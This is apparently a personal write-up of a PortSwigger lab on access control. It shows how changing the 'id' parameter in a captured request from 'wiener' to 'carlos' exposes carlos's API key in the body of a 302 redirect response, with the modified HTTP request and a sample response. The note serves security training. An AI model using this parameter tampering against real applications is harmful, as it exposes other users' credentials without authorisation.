
# #PortSwigger 



![[Pasted image 20251216200919.png]]




## Description

This lab contains an access control vulnerability where **sensitive information is leaked in the body of a redirect response**.

**Credentials:** `wiener:peter`

**Objective:** Obtain the API key for the user `carlos` and submit it as the solution.

**The flaw:** Even though the response is a redirect (302), the response **body still contains the API key** of the requested user before the redirect occurs. This is a **data leakage** vulnerability.

---
---

## Solution Steps

### Step 1: Log in to Your Account

1. Log in using `wiener:peter`
2. Go to your account page

### Step 2: Examine the URL

Observe that the URL contains your username in an `id` parameter:

```
https://YOUR-LAB-ID.web-security-academy.net/my-account?id=wiener
```





### Step 3: Send Request to Burp Repeater

1. Capture the request to `/my-account?id=wiener`
2. Send it to **Burp Repeater**

![[Pasted image 20251216203012.png]]






### Step 4: Change the id Parameter

Change the `id` parameter from `wiener` to `carlos`:

```
GET /my-account?id=carlos HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
```

![[Pasted image 20251216202955.png]]




### Step 5: Send the Request

Send the modified request and examine the response.

**Observe:** The response status is **302 Redirect** (redirecting to the home page), but the **response body still contains carlos's API key**!

![[Pasted image 20260510182030.png]]





### Step 6: Extract the API Key

Look in the response body for the API key:

```
HTTP/1.1 302 Found
Location: /
Content-Type: text/html; charset=utf-8
Content-Length: XXX

<!DOCTYPE html>
<html>
<body>
    <div>API Key for carlos: 8a7f3d9e2b1c4f5a6d8e9f0a1b2c3d4e</div>
</body>
</html>
```

The application built the response page (containing the API key) before realizing it should redirect, and sent both.






### Step 7: Submit the API Key
1. Extract carlos's API key from the response body
2. Submit it on the lab page
3. The lab is marked as **Solved**

![[Pasted image 20251216203122.png]]

---
